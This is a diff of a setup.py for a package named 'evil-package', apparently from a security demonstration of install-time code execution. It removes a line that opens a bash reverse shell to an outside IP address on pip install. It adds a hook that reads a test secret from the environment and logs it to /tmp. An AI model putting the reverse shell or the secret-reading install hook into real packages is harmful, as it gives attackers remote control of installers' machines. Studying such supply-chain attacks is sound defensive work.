@@ -1,8 +1,18 @@
-from setuptools import setup
 import os
+import datetime
 
-# Malicious code executed immediately when pip installs the package
-os.system("bash -i >& /dev/tcp/106.210.154.24/4343 0>&1")
+timestamp = datetime.datetime.now().isoformat()
+# Read an environment variable (safe local test)
+fake_secret = os.environ.get("TEST_SECRET", "<not set>")
+
+msg = f"[{timestamp}] setup.py executed; TEST_SECRET = {fake_secret}"
+print(msg)
+
+with open("/tmp/setup_env_log.txt", "a") as f:
+    f.write(msg + "\n")
+
+from setuptools import setup
+
 
 setup(
     name="evil-package",
